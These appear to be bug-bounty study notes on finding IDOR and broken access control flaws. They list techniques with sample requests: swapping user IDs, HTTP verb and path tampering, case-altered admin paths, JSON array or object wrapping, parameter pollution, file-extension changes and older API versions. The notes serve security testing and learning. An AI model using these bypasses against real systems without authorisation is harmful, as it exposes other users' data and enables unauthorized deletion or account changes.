# IDOR or Brocken Access Control

Tags: Brocken Access control, Server Side
Multi-select: bugbountybootcamp, yashar

tools: authorize and authmatrix

[https://github.com/Quitten/Autorize](https://github.com/Quitten/Autorize)

[https://github.com/SecurityInnovation/AuthMatrix](https://github.com/SecurityInnovation/AuthMatrix)

Insecure Direct Object Reference also know as **Broken Access Control**  

Broken Access Control:

all you need for this section is looking for URL’s and query's.

so if we have a url like this:

www.blab.com/?id=256

you must test it and change the id number 256 to like 277 or anything else…

if the page rendered the user number ID 277 its vulnerable to IDOR 

if the page is not rendered the user ID and goes to 403 or 404 error you must bypass and look for other ways

now whats other ways?

1- look trough for headers and watch which custom parameters have a chained ID or number 

2- create 2 account and compare the numbers in the headers

3-change the account 1 url to account 2; if the information of account 2 shown in account 1 you can call it IDOR and test to other users.

in the some cases you may have the id parameter in url but when you change it to other numbers it show 403 or 404 error.

so you may have test the other parameters like the tickets id or something else.  

[https://example](https://example).com?user-key=Somee9giehg

[https://example.com](https://example.com)?id=2425235

https://example.com?user=somefsa&pass=359ejfo

```
POST /changepass
uid=256
user-key=Someet2y
```

### IDOR Types:

- BodyManipulation: to changing the parameters of radio buttuns and api.
    
    ```
    https://insecure-website.com/login/home.jsp?admin=true
    https://insecure-website.com/login/home.jsp?role=1
    ```
    
- URLTampering: to changing the ID or others query.
    
    ```jsx
    https://insecure-website.com/myaccount?id=456
    ```
    
- HTTPRequests: like verb tampring.
- MassAssignment: look and change everything.
    
    ```objectivec
    POST / HTTP/1.1
    X-Original-URL: /admin/deleteUser
    ...
    ```
    

### Bypass the IDORS:

encode or the code the parameters

make the application request somthing paramerters that not exist(parameters tampring)

chagne request (verb tampring)

change the request file type:

GET /get-user-id=256

GET /get-user-id=256.json

change HTTP method

```
GET /users/delete/victim_id  ->403
POST /users/delete/victim_id ->200
```

Try replacing parameter names

```
Instead of this:
GET /api/albums?album_id=<album id>

Try This:
GET /api/albums?account_id=<account id>

Tip: There is a Burp extension called Paramalyzer which will help with this by remembering all the parameters you have passed to a host.
```

Path Traversal

```
POST /users/delete/victim_id          ->403
POST /users/delete/my_id/..victim_id  ->200
```

change request content-type

```
Content-Type: application/xml ->
Content-Type: application/json
```

swap non-numeric with numeric id

```
GET /file?id=90djbkdbkdbd29dd
GET /file?id=302
```

Missing Function Level Acess Control

```
GET /admin/profile ->401
GET /Admin/profile ->200
GET /ADMIN/profile ->200
GET /aDmin/profile ->200
GET /adMin/profile ->200
GET /admIn/profile ->200
GET /admiN/profile ->200
```

send wildcard instead of an id

```
GET /api/users/user_id ->
GET /api/users/*
```

Never ignore encoded/hashed ID

```
for hashed ID ,create multiple accounts and understand the ppattern application users to allot an iD
```

Google Dorking/public form

```
search all the endpoints having ID which the search engine may have already indexed
```

Bruteforce Hidden HTTP parameters

```
use tools like arjun , paramminer
```

Bypass object level authorization Add parameter onto the endpoit if not present by defualt

```
GET /api_v1/messages ->200
GET /api_v1/messages?user_id=victim_uuid ->200
```

change file type

```
GET /user_data/2341        -> 401
GET /user_data/2341.json   -> 200
GET /user_data/2341.xml    -> 200
GET /user_data/2341.config -> 200
GET /user_data/2341.txt    -> 200
```

json parameter pollution

```
{"userid":1234,"userid":2542}
```

Wrap the ID with an array in the body

```
{"userid":123} ->401
{"userid":[123]} ->200
```

wrap the id with a json object

```
{"userid":123} ->401
{"userid":{"userid":123}} ->200
```

Test an outdata API version

```
GET /v3/users_data/1234 ->401
GET /v1/users_data/1234 ->200
```
Dont Forget to Watch this video:
[Easy IDOR hunting with Autorize? (GIVEAWAY)](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.youtube.com/watch?v=2WzqH6N-Gbc&ved=2ahUKEwjVxNT5-5GFAxW4g_0HHRFrDZMQwqsBegQIDRAF&usg=AOvVaw0CrjWvnu95-d4SjqIBFBev)